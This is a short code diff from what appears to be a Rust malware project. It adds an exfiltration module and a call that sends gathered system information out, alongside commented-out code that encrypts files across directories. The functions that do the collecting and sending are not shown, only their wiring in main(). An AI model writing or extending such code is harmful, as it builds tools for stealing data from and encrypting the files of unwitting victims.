@@ -3,7 +3,8 @@ use std::process;
 mod settings;
 mod encryption_functions;
 mod tests;
-mod info_grab;
+mod infograb_functions;
+mod exfiltration_functions;
 use crate::settings::Config;
 use crate::encryption_functions::iterate_dir;
 fn main() {
@@ -16,8 +17,9 @@ fn main() {
     style();
     iterate_dir(&mut config); */
     println!("Trying to get info");
-    let result = info_grab::get_info();
-    println!("Result: {:?}", result);
+    let result = infograb_functions::get_info();
+    println!("{:?}", result);
+    exfiltration_functions::exfiltrate_infos(result);
 }
 fn style() {
     println!("---------------------------------------");
